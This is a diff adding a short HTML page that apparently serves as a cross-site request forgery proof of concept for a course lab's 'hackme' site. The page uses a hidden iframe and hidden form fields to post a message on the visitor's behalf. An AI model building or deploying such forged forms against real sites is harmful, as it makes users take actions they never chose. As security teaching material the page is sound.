@@ -1,0 +1,23 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+<style>
+#hidden-iframe { 
+	width: 900px;
+	margin: 0 auto;
+}
+</style>
+<body>
+  <form action="http://infosec-020-105/hackme-personal/post.php" method="post">
+    <button id="submit" name="post_submit" value="upvote">Upvote</button>
+</form>
+<iframe id="hidden-iframe" name="hidden-result" style="display:none;"></iframe>
+<form action="http://infosec-020-105/hackme-personal/post.php" method="post" target="hidden-result">
+    <input name="post_submit" type="submit" value="Skicka Tips">
+    <input type="hidden" name="title" value="test2">
+    <input type="hidden" name="message" value="test2">
+</form>
+</body>
+</html>
